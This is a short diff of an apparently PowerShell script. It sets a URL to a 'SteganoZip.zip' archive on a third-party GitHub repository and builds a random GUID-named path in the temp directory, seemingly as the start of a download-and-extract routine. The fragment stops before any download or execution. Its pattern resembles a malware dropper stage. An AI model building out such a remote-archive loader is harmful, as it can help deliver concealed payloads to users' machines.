@@ -1,6 +1,6 @@
 $url = "https://github.com/cuunon9x/ghe/blob/main/SteganoZip.zip"
 $dir = [System.Guid]::NewGuid().ToString()
-$zipPath = "$env:temp\$dir.zip"
+$zipPath = "$env:temp\$dir"
 $extractPath = "$env:temp\$dir"
 
 # Download the file
